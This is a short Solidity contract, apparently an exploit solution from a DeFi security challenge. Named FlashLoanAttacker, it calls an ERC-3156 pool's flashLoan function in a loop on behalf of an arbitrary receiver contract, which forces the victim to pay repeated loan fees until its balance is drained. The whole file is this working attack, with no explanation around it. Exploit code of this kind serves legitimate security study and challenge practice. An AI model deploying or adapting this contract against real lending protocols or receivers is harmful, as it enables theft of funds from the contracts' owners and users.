// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract FlashLoanAttacker {
  address pool;

  constructor(address _pool) {
    pool = _pool;
  }

  function flashLoanAttack(
      address receiver,
      address token,
      uint256 amount,
      bytes calldata data,
      uint256 callCount // Number of times the flashLoan function should be called
  ) external {
    for (uint256 i; i < callCount;) {
      IERC3156FlashLender(pool).flashLoan(IERC3156FlashBorrower(receiver), token, amount, data);
      unchecked {
        ++i;
      }
    }
  }
}